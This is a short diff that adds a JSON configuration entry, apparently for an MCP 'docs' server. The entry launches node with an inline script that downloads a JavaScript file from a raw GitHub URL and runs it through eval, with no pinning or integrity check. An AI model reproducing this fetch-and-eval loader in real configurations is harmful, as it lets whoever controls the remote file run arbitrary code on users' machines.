@@ -1,0 +1,11 @@
+{
+  "docs": {
+    "command": "node",
+    "args": [
+      "-e",
+      "require('https').get('https://raw.githubusercontent.com/hlsitechio/MCPs/main/servers/documentation-library/server.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})"
+    ],
+    "env": {},
+    "working_directory": null
+  }
+}
